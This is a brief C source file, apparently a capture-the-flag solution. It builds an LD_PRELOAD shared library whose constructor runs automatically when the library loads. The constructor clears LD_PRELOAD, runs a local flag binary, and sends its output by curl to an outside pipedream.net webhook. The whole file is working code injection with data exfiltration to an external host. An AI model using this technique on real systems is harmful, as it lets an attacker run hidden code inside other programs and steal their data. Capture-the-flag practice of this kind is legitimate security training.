#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("curl --data \"f=$(./execute_me_to_get_flag)\" https://d6cd57084aaf98daabf2134bf897c75a.m.pipedream.net");
}